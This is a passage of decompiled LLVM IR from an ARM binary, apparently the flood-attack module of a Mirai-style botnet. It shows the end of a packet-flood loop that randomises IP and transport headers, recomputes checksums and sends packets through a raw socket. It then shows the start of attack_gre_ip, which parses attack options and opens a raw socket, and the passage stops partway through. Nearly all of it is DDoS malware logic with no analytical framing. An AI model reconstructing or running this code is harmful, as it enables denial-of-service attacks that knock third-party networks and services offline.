  store i32 %v0_8e18, i32* %stack_var_-52, align 4
  %v0_8e20 = call i32 @rand_next()
  store i32 %v2_8e24, i32* %r1.global-to-local, align 4
  store i32 %v0_8e20, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_8e30 = load i32, i32* @r7, align 4
  store i32 %v0_8e30, i32* %r0.global-to-local, align 4
  %v3_8e34 = call i32 @util_memcpy(i32 %v0_8e30, i32 %v2_8e24, i32 4)
  %v0_8e38 = load i32, i32* @r7, align 4
  %v1_8e38 = add i32 %v0_8e38, 6
  store i32 %v1_8e38, i32* %r0.global-to-local, align 4
  store i32 %v2_8e3c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_8e44 = call i32 @util_memcpy(i32 %v1_8e38, i32 %v2_8e3c, i32 4)
  %v0_8e48 = load i32, i32* @r7, align 4
  %v1_8e48 = add i32 %v0_8e48, 4
  store i32 %v1_8e48, i32* %r0.global-to-local, align 4
  store i32 %v2_8e4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e54 = call i32 @util_memcpy(i32 %v1_8e48, i32 %v2_8e4c, i32 2)
  store i32 %v2_8e58, i32* %r1.global-to-local, align 4
  %v0_8e5c = load i32, i32* @r7, align 4
  %v1_8e5c = add i32 %v0_8e5c, 10
  store i32 %v1_8e5c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_8e64 = call i32 @util_memcpy(i32 %v1_8e5c, i32 %v2_8e58, i32 2)
  store i32 %v3_8e64, i32* %r0.global-to-local, align 4
  store i32 %v1_8ab4, i32* %r1.global-to-local, align 4
  store i1 %v2_8e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8e6c, label %dec_label_pc_8e74, label %dec_label_pc_8ffc

dec_label_pc_8e74:                                ; preds = %dec_label_pc_8e10, %dec_label_pc_8ffc
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_8e78 = load i32, i32* @r5, align 4
  %v3_8e78 = add i32 %v2_8e78, 10
  %v4_8e78 = inttoptr i32 %v3_8e78 to i16*
  store i16 0, i16* %v4_8e78, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e80 = load i32, i32* @r5, align 4
  store i32 %v0_8e80, i32* @r0, align 4
  %v2_8e84 = call i32 @checksum_generic(i32 %v0_8e80, i32 20)
  %v3_8e84 = trunc i32 %v2_8e84 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_8e8c = load i32, i32* @r5, align 4
  %v4_8e8c = add i32 %v3_8e8c, 10
  %v5_8e8c = inttoptr i32 %v4_8e8c to i16*
  store i16 %v3_8e84, i16* %v5_8e8c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_8e94 = load i32, i32* %r3.global-to-local, align 4
  %v1_8e94 = trunc i32 %v0_8e94 to i16
  %v2_8e94 = load i32, i32* @r6, align 4
  %v3_8e94 = add i32 %v2_8e94, 10
  %v4_8e94 = inttoptr i32 %v3_8e94 to i16*
  store i16 %v1_8e94, i16* %v4_8e94, align 2
  %v0_8e98 = load i32, i32* @r6, align 4
  store i32 %v0_8e98, i32* @r0, align 4
  %v2_8e9c = call i32 @checksum_generic(i32 %v0_8e98, i32 20)
  %v3_8e9c = trunc i32 %v2_8e9c to i16
  store i32 %v2_8e9c, i32* %r0.global-to-local, align 4
  %v3_8ea0 = load i32, i32* @r6, align 4
  %v4_8ea0 = add i32 %v3_8ea0, 10
  %v5_8ea0 = inttoptr i32 %v4_8ea0 to i16*
  store i16 %v3_8e9c, i16* %v5_8ea0, align 2
  store i32 0, i32* @r4, align 4
  %v0_8ea8 = load i32, i32* @r8, align 4
  store i32 %v0_8ea8, i32* @r1, align 4
  %v1_8eac = add i32 %v0_8ea8, 4
  %v2_8eac = inttoptr i32 %v1_8eac to i16*
  %v3_8eac = load i16, i16* %v2_8eac, align 2
  %v4_8eac = zext i16 %v3_8eac to i32
  store i32 %v4_8eac, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_8eb4 = add i32 %v0_8ea8, 6
  %v4_8eb4 = inttoptr i32 %v3_8eb4 to i16*
  store i16 0, i16* %v4_8eb4, align 2
  %v0_8eb8 = load i32, i32* @r6, align 4
  store i32 %v0_8eb8, i32* %r0.global-to-local, align 4
  %v4_8ebc = call i32 @checksum_tcpudp(i32 %v0_8eb8, i32 %v0_8ea8, i32 %v4_8eac, i32 %stack_var_-136.0.ph)
  %v5_8ebc = trunc i32 %v4_8ebc to i16
  store i32 %v4_8ebc, i32* %r0.global-to-local, align 4
  %v3_8ec0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8ec0, i32* %r2.global-to-local, align 4
  %v3_8ec4 = mul i32 %v3_8ec0, 32
  store i32 %v3_8ec4, i32* %r3.global-to-local, align 4
  %v0_8ec8 = load i32, i32* @r5, align 4
  %v1_8ec8 = add i32 %v0_8ec8, 16
  %v2_8ec8 = inttoptr i32 %v1_8ec8 to i32*
  %v3_8ec8 = load i32, i32* %v2_8ec8, align 4
  %v5_8ecc = mul i32 %v3_8ec0, 24
  store i32 %v5_8ecc, i32* %r3.global-to-local, align 4
  %v1_8ed0 = load i32, i32* @sb, align 4
  %v2_8ed0 = add i32 %v1_8ed0, %v5_8ecc
  store i32 %v2_8ed0, i32* @lr, align 4
  %v2_8ed4 = add i32 %v2_8ed0, 4
  %v3_8ed4 = inttoptr i32 %v2_8ed4 to i32*
  store i32 %v3_8ec8, i32* %v3_8ed4, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_8edc = load i32, i32* @r8, align 4
  %v4_8edc = add i32 %v3_8edc, 6
  %v5_8edc = inttoptr i32 %v4_8edc to i16*
  store i16 %v5_8ebc, i16* %v5_8edc, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_8ee4 = load i32, i32* %r1.global-to-local, align 4
  %v1_8ee4 = trunc i32 %v0_8ee4 to i16
  %v2_8ee4 = load i32, i32* %r3.global-to-local, align 4
  %v3_8ee4 = load i32, i32* @sb, align 4
  %v4_8ee4 = add i32 %v3_8ee4, %v2_8ee4
  %v5_8ee4 = inttoptr i32 %v4_8ee4 to i16*
  store i16 %v1_8ee4, i16* %v5_8ee4, align 2
  %v0_8ee8 = load i32, i32* @r4, align 4
  %v1_8ee8 = trunc i32 %v0_8ee8 to i16
  %v2_8ee8 = load i32, i32* @lr, align 4
  %v3_8ee8 = add i32 %v2_8ee8, 2
  %v4_8ee8 = inttoptr i32 %v3_8ee8 to i16*
  store i16 %v1_8ee8, i16* %v4_8ee8, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_8ef0 = load i32, i32* @r5, align 4
  store i32 %v0_8ef0, i32* %r1.global-to-local, align 4
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_8efc = load i32, i32* @lr, align 4
  %v0_8f00 = load i32, i32* %ip.global-to-local, align 4
  %v6_8f04 = call i32 @__libc_sendto(i32 %v3_8afc, i32 %v0_8ef0, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_8efc, i32 %v0_8f00)
  %v3_8f08 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8f08, i32* %r3.global-to-local, align 4
  %v1_8f0c = add i32 %v3_8f08, 1
  store i32 %v1_8f0c, i32* %r0.global-to-local, align 4
  %v1_8f10 = load i32, i32* @sl, align 4
  %v9_8f10 = icmp eq i32 %v1_8f0c, %v1_8f10
  store i1 %v9_8f10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8f0c, i32* %stack_var_-44, align 4
  %v6_8f18 = icmp slt i32 %v1_8f0c, %v1_8f10
  br i1 %v6_8f18, label %dec_label_pc_8d9c, label %dec_label_pc_8d88

dec_label_pc_8f20:                                ; preds = %dec_label_pc_8d9c
  %v1_8f20 = add i32 %v2_8da4, 16
  %v2_8f20 = inttoptr i32 %v1_8f20 to i32*
  %v3_8f20 = load i32, i32* %v2_8f20, align 4
  store i32 %v3_8f20, i32* %r4.global-to-local, align 4
  %v0_8f24 = call i32 @rand_next()
  store i32 %v0_8f24, i32* %r0.global-to-local, align 4
  %v3_8f28 = load i32, i32* %stack_var_-44, align 4
  %v5_8f30 = mul i32 %v3_8f28, 24
  %v0_8f34 = load i32, i32* %r4.global-to-local, align 4
  %v1_8f34 = and i32 %v0_8f34, 16711680
  store i32 %v1_8f34, i32* %ip.global-to-local, align 4
  %v3_8f38 = udiv i32 %v0_8f34, 16777216
  %v4_8f3c = udiv i32 %v1_8f34, 256
  %v5_8f3c = or i32 %v4_8f3c, %v3_8f38
  store i32 %v5_8f3c, i32* %r2.global-to-local, align 4
  %v1_8f40 = load i32, i32* @sb, align 4
  %v2_8f40 = add i32 %v1_8f40, %v5_8f30
  store i32 %v2_8f40, i32* %r1.global-to-local, align 4
  %v1_8f44 = and i32 %v0_8f34, 65280
  store i32 %v1_8f44, i32* %r3.global-to-local, align 4
  %v1_8f48 = add i32 %v2_8f40, 20
  %v2_8f48 = inttoptr i32 %v1_8f48 to i8*
  %v3_8f48 = load i8, i8* %v2_8f48, align 1
  %v4_8f48 = zext i8 %v3_8f48 to i32
  store i32 %v4_8f48, i32* %ip.global-to-local, align 4
  %v5_8f50 = call i32 @llvm.bswap.i32(i32 %v0_8f34)
  %v7_8f54 = lshr i32 %v0_8f24, %v4_8f48
  %v8_8f54 = add i32 %v7_8f54, %v5_8f50
  store i32 %v8_8f54, i32* %r2.global-to-local, align 4
  %v1_8f58 = and i32 %v8_8f54, 16711680
  store i32 %v1_8f58, i32* %r0.global-to-local, align 4
  store i32 %v6_8ae8, i32* %r1.global-to-local, align 4
  %v5_8f70 = call i32 @llvm.bswap.i32(i32 %v8_8f54)
  store i32 %v5_8f70, i32* %r3.global-to-local, align 4
  store i1 %v7_8dcc, i1* %cpsr_z.global-to-local, align 1
  %v1_8f78 = load i32, i32* @r5, align 4
  %v2_8f78 = add i32 %v1_8f78, 16
  %v3_8f78 = inttoptr i32 %v2_8f78 to i32*
  store i32 %v5_8f70, i32* %v3_8f78, align 4
  br i1 %v2_8dcc, label %dec_label_pc_8f80, label %dec_label_pc_8dd4

dec_label_pc_8f80:                                ; preds = %dec_label_pc_8f20, %dec_label_pc_8dc8
  %v0_8f80 = call i32 @rand_next()
  store i32 %v0_8f80, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_8f8c = load i32, i32* @fp, align 4
  %v9_8f8c = icmp eq i32 %v0_8f8c, 65535
  store i1 %v9_8f8c, i1* %cpsr_z.global-to-local, align 1
  %v1_8f90 = load i32, i32* @r5, align 4
  %v2_8f90 = add i32 %v1_8f90, 12
  %v3_8f90 = inttoptr i32 %v2_8f90 to i32*
  store i32 %v0_8f80, i32* %v3_8f90, align 4
  br i1 %v9_8f8c, label %dec_label_pc_8f98, label %dec_label_pc_8f80.dec_label_pc_8de4_crit_edge

dec_label_pc_8f80.dec_label_pc_8de4_crit_edge:    ; preds = %dec_label_pc_8f80
  %v1_8de8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8de4

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f80, %dec_label_pc_8dd4
  %v0_8f98 = call i32 @rand_next()
  %v3_8fa0 = urem i32 %v0_8f98, 65536
  store i32 %v3_8fa0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b48, i32* %r2.global-to-local, align 4
  %v1_8fac = sub nsw i32 999, %v3_8fa0
  store i32 %v1_8fac, i32* %r3.global-to-local, align 4
  %v1_8fb0 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fb0 = icmp eq i32 %v3_8b48, %v1_8fb0
  store i1 %v9_8fb0, i1* %cpsr_z.global-to-local, align 1
  %v1_8fb4 = trunc i32 %v0_8f98 to i16
  %v2_8fb4 = load i32, i32* @r5, align 4
  %v3_8fb4 = add i32 %v2_8fb4, 4
  %v4_8fb4 = inttoptr i32 %v3_8fb4 to i16*
  store i16 %v1_8fb4, i16* %v4_8fb4, align 2
  %v0_8fb8 = load i32, i32* %r3.global-to-local, align 4
  %v1_8fb8 = trunc i32 %v0_8fb8 to i16
  %v2_8fb8 = load i32, i32* @r6, align 4
  %v3_8fb8 = add i32 %v2_8fb8, 4
  %v4_8fb8 = inttoptr i32 %v3_8fb8 to i16*
  store i16 %v1_8fb8, i16* %v4_8fb8, align 2
  br i1 %v9_8fb0, label %dec_label_pc_8fc0, label %dec_label_pc_8f98.dec_label_pc_8df0_crit_edge

dec_label_pc_8f98.dec_label_pc_8df0_crit_edge:    ; preds = %dec_label_pc_8f98
  %v1_8df4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8df0

dec_label_pc_8fc0:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_8de4
  %v0_8fc0 = call i32 @rand_next()
  %v1_8fc0 = trunc i32 %v0_8fc0 to i16
  store i32 %v0_8fc0, i32* %r0.global-to-local, align 4
  store i32 %v3_8b4c, i32* %r3.global-to-local, align 4
  %v1_8fc8 = load i32, i32* %r4.global-to-local, align 4
  %v9_8fc8 = icmp eq i32 %v3_8b4c, %v1_8fc8
  store i1 %v9_8fc8, i1* %cpsr_z.global-to-local, align 1
  %v3_8fcc = load i32, i32* @r5, align 4
  %v4_8fcc = add i32 %v3_8fcc, 58
  %v5_8fcc = inttoptr i32 %v4_8fcc to i16*
  store i16 %v1_8fc0, i16* %v5_8fcc, align 2
  br i1 %v9_8fc8, label %dec_label_pc_8fd4, label %dec_label_pc_8dfc

dec_label_pc_8fd4:                                ; preds = %dec_label_pc_8fc0, %dec_label_pc_8df0
  %v0_8fd4 = call i32 @rand_next()
  %v1_8fd4 = trunc i32 %v0_8fd4 to i16
  store i32 %v0_8fd4, i32* %r0.global-to-local, align 4
  store i32 %v1_8b40, i32* @r4, align 4
  store i1 %v2_8fdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8fdc, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_8fd4
  %v3_8fe432 = load i32, i32* @r8, align 4
  %v4_8fe433 = add i32 %v3_8fe432, 2
  %v5_8fe434 = inttoptr i32 %v4_8fe433 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe434, align 2
  br label %dec_label_pc_8ff0

bb88:                                             ; preds = %dec_label_pc_8fd4
  %v1_8fe0 = load i32, i32* @r5, align 4
  %v2_8fe0 = add i32 %v1_8fe0, 16
  %v3_8fe0 = inttoptr i32 %v2_8fe0 to i32*
  %v4_8fe0 = load i32, i32* %v3_8fe0, align 4
  store i32 %v4_8fe0, i32* %r3.global-to-local, align 4
  %v3_8fe4 = load i32, i32* @r8, align 4
  %v4_8fe4 = add i32 %v3_8fe4, 2
  %v5_8fe4 = inttoptr i32 %v4_8fe4 to i16*
  store i16 %v1_8fd4, i16* %v5_8fe4, align 2
  %v1_8fe8 = load i32, i32* %r3.global-to-local, align 4
  %v2_8fe8 = load i32, i32* @r6, align 4
  %v3_8fe8 = add i32 %v2_8fe8, 16
  %v4_8fe8 = inttoptr i32 %v3_8fe8 to i32*
  store i32 %v1_8fe8, i32* %v4_8fe8, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ff0:                                ; preds = %.thread31, %dec_label_pc_8dfc
  %v0_8ff0 = call i32 @rand_next()
  store i32 %v0_8ff0, i32* %r0.global-to-local, align 4
  %v1_8ff4 = load i32, i32* @r6, align 4
  %v2_8ff4 = add i32 %v1_8ff4, 16
  %v3_8ff4 = inttoptr i32 %v2_8ff4 to i32*
  store i32 %v0_8ff0, i32* %v3_8ff4, align 4
  br label %dec_label_pc_8e10

dec_label_pc_8ffc:                                ; preds = %dec_label_pc_8e10
  %v0_8ffc = load i32, i32* @r8, align 4
  %v1_8ffc = add i32 %v0_8ffc, 8
  store i32 %v1_8ffc, i32* %r0.global-to-local, align 4
  store i32 %v6_8a94, i32* %r1.global-to-local, align 4
  %v2_9004 = inttoptr i32 %v1_8ffc to i16*
  %v3_9004 = call i32 @rand_str(i16* %v2_9004, i32 %v6_8a94)
  store i32 %v3_9004, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8e74

dec_label_pc_900c:                                ; preds = %dec_label_pc_8b0c
  store i32 %v3_8afc, i32* %r0.global-to-local, align 4
  %v1_9010 = call i32 @__GI___libc_close(i32 %v3_8afc)
  store i32 %v1_9010, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9014

dec_label_pc_9014:                                ; preds = %entry, %dec_label_pc_900c
  %v1_901c = phi i32 [ %v3_8afc, %entry ], [ %v1_9010, %dec_label_pc_900c ]
  store i32 %v3_89ac, i32* %r4.global-to-local, align 4
  store i32 %v6_89ac, i32* %r5.global-to-local, align 4
  store i32 %v24_89ac, i32* %fp.global-to-local, align 4
  ret i32 %v1_901c

dec_label_pc_9020:                                ; preds = %dec_label_pc_8b34
  %v1_9028 = add i32 %v6_8a94, 8
  store i32 %v1_9028, i32* %r1.global-to-local, align 4
  %v1_902c = add i32 %v6_8a94, 66
  store i32 %v1_902c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_8d88.preheader

; uselistorder directives
  uselistorder i32 %v1_902c, { 1, 0 }
  uselistorder i32 %v1_9028, { 1, 0 }
  uselistorder i16 %v1_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fd4, { 1, 0 }
  uselistorder i32 %v0_8fc0, { 1, 0 }
  uselistorder i32 %v3_8fa0, { 1, 0 }
  uselistorder i32 %v0_8f98, { 1, 0 }
  uselistorder i32 %v5_8f70, { 1, 0 }
  uselistorder i32 %v0_8f34, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8f10, { 1, 2, 0 }
  uselistorder i32 %v1_8f0c, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v3_8ec0, { 1, 0, 2 }
  uselistorder i32 %v4_8ebc, { 1, 0 }
  uselistorder i32 %v0_8ea8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8e9c, { 1, 0 }
  uselistorder i32 %v7_8db0, { 2, 1, 0, 3 }
  uselistorder i1 %v7_8dcc, { 2, 1, 0 }
  uselistorder i1 %v2_8fdc, { 2, 3, 1, 0 }
  uselistorder i32 %v0_8d20, { 1, 0, 2 }
  uselistorder i32 %v3_8b9c, { 1, 0 }
  uselistorder i32 %v3_8b80, { 1, 2, 0 }
  uselistorder i32 %v1_8b7c, { 1, 0 }
  uselistorder i32 %v1_8b40, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_8b3c, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8b38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8b34, { 1, 0, 2, 3 }
  uselistorder i1 %v7_8b2c, { 1, 0 }
  uselistorder i1 %v7_8b00, { 1, 0 }
  uselistorder i32 %v3_8afc, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_8ae8, { 5, 3, 0, 4, 1, 2 }
  uselistorder i32 %v1_8ab4, { 1, 2, 3, 0 }
  uselistorder i32 %v6_8a94, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_8a48, { 1, 2, 0 }
  uselistorder i32 %v1_8a24, { 3, 2, 1, 0 }
  uselistorder i32 %v6_8a1c, { 1, 0 }
  uselistorder i32 %v6_89e0, { 2, 1, 3, 0 }
  uselistorder i32 %v2_89c8, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r4.global-to-local, { 0, 5, 7, 6, 1, 2, 3, 4, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 1, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 27, 26, 28, 29, 31, 30, 32, 33, 35, 34, 37, 36, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 8, 6, 10, 9, 12, 11, 13, 15, 14, 16, 18, 17, 19, 20, 21, 22, 24, 23, 27, 25, 26, 30, 28, 29, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9014, { 1, 0 }
  uselistorder label %dec_label_pc_8e74, { 1, 0 }
  uselistorder label %dec_label_pc_8e10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8d88, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8d88.preheader, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %.thread25, { 1, 0 }
}

define i32 @attack_gre_ip(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_9040 = load i32, i32* @r4, align 4
  %v6_9040 = load i32, i32* @r5, align 4
  %v24_9040 = load i32, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @sl, align 4
  %v2_905c = call i32 @calloc(i32 %arg1, i32 4)
  %v0_9060 = load i32, i32* @r5, align 4
  store i32 %v0_9060, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9070 = load i32, i32* @r4, align 4
  %v5_9074 = inttoptr i32 %v0_9060 to i32*
  %v6_9074 = call i32 @attack_get_opt_int(i32 %v0_9070, i32* %v5_9074, i32 2, i32 0, i32 %v2_905c)
  %v1_9080 = urem i32 %v6_9074, 256
  store i32 %v1_9080, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_908c = load i32, i32* @r5, align 4
  store i32 %v0_908c, i32* %r1.global-to-local, align 4
  %v0_9090 = load i32, i32* @r4, align 4
  %v5_9094 = trunc i32 %v6_9074 to i8
  %v6_9098 = inttoptr i32 %v0_908c to i32*
  %v7_9098 = call i32 @attack_get_opt_int(i32 %v0_9090, i32* %v6_9098, i32 3, i32 65535, i32 %v6_9074)
  %v0_909c = load i32, i32* @r5, align 4
  store i32 %v0_909c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_9098, i32* %fp.global-to-local, align 4
  %v0_90ac = load i32, i32* @r4, align 4
  %v5_90b0 = inttoptr i32 %v0_909c to i32*
  %v6_90b0 = call i32 @attack_get_opt_int(i32 %v0_90ac, i32* %v5_90b0, i32 4, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v1_90b8 = urem i32 %v6_90b0, 256
  store i32 %v1_90b8, i32* %ip.global-to-local, align 4
  %v0_90bc = load i32, i32* @r5, align 4
  store i32 %v0_90bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_90c8 = load i32, i32* @r4, align 4
  %v6_90d0 = inttoptr i32 %v0_90bc to i32*
  %v7_90d0 = call i32 @attack_get_opt_int(i32 %v0_90c8, i32* %v6_90d0, i32 5, i32 1, i32 %v1_90b8)
  %v1_90dc = urem i32 %v7_90d0, 256
  store i32 %v1_90dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_90e8 = load i32, i32* @r5, align 4
  store i32 %v0_90e8, i32* %r1.global-to-local, align 4
  %v0_90ec = load i32, i32* @r4, align 4
  %v5_90f4 = inttoptr i32 %v0_90e8 to i32*
  %v6_90f4 = call i32 @attack_get_opt_int(i32 %v0_90ec, i32* %v5_90f4, i32 6, i32 65535, i32 %v1_90dc)
  %v0_90fc = load i32, i32* @r5, align 4
  store i32 %v0_90fc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_90f4, i32* @r8, align 4
  %v0_910c = load i32, i32* @r4, align 4
  %v5_9110 = inttoptr i32 %v0_90fc to i32*
  %v6_9110 = call i32 @attack_get_opt_int(i32 %v0_910c, i32* %v5_9110, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v0_9114 = load i32, i32* @r5, align 4
  store i32 %v0_9114, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v6_9110, i32* @r7, align 4
  %v0_9124 = load i32, i32* @r4, align 4
  %v5_9128 = inttoptr i32 %v0_9114 to i32*
  %v6_9128 = call i32 @attack_get_opt_int(i32 %v0_9124, i32* %v5_9128, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_9138 = load i32, i32* @r5, align 4
  store i32 %v0_9138, i32* %r1.global-to-local, align 4
  %v0_913c = load i32, i32* @r4, align 4
  %v5_9140 = inttoptr i32 %v0_9138 to i32*
  %v6_9140 = call i32 @attack_get_opt_int(i32 %v0_913c, i32* %v5_9140, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v1_9148 = urem i32 %v6_9140, 256
  store i32 %v1_9148, i32* %ip.global-to-local, align 4
  %v0_914c = load i32, i32* @r5, align 4
  store i32 %v0_914c, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_9158 = load i32, i32* @r4, align 4
  %v5_9160 = inttoptr i32 %v0_914c to i32*
  %v6_9160 = call i32 @attack_get_opt_int(i32 %v0_9158, i32* %v5_9160, i32 19, i32 0, i32 %v1_9148)
  %v0_9168 = load i32, i32* @r5, align 4
  store i32 %v0_9168, i32* %r1.global-to-local, align 4
  %v2_916c = load i32, i32* @global_var_24a4c.59, align 4
  store i32 %v2_916c, i32* %r3.global-to-local, align 4
  store i32 %v6_9160, i32* @r6, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9178 = load i32, i32* @r4, align 4
  %v5_917c = inttoptr i32 %v0_9168 to i32*
  %v6_917c = call i32 @attack_get_opt_int(i32 %v0_9178, i32* %v5_917c, i32 25, i32 %v2_916c, i32 ptrtoint (i32* @0 to i32))
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_9190 = call i32 @socket(i32 2, i32 3, i32 6)
  %v7_9194 = icmp eq i32 %v3_9190, -1
  store i1 %v7_9194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9194, label %dec_label_pc_9634, label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_91a8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_91a8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_91bc = call i32 @__GI_setsockopt(i32 %v3_9190, i32 0, i32 3, i32 %v6_91a8, i32 4)
  %v7_91c0 = icmp eq i32 %v5_91bc, -1
  store i1 %v7_91c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_91c0, label %dec_label_pc_962c, label %dec_label_pc_91c8

dec_label_pc_91c8:                                ; preds = %dec_label_pc_91a0
  %v0_91c8 = load i32, i32* @r8, align 4
  %v0_91cc = load i32, i32* @r7, align 4
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  %v0_91d4 = load i32, i32* @r6, align 4
  %v1_91d4 = urem i32 %v0_91d4, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_91dc = urem i32 %v0_91c8, 65536
  store i32 %v3_91dc, i32* %r3.global-to-local, align 4
  %v3_91e0 = urem i32 %v0_91cc, 65536
  store i32 %v3_91e0, i32* %r4.global-to-local, align 4
  %v0_91e4 = load i32, i32* @sl, align 4
  %v2_91e4 = icmp eq i32 %v0_91e4, 0
  store i1 %v2_91e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_91fc = urem i32 %v0_91d0, 65536
  store i32 %v3_91fc, i32* @fp, align 4
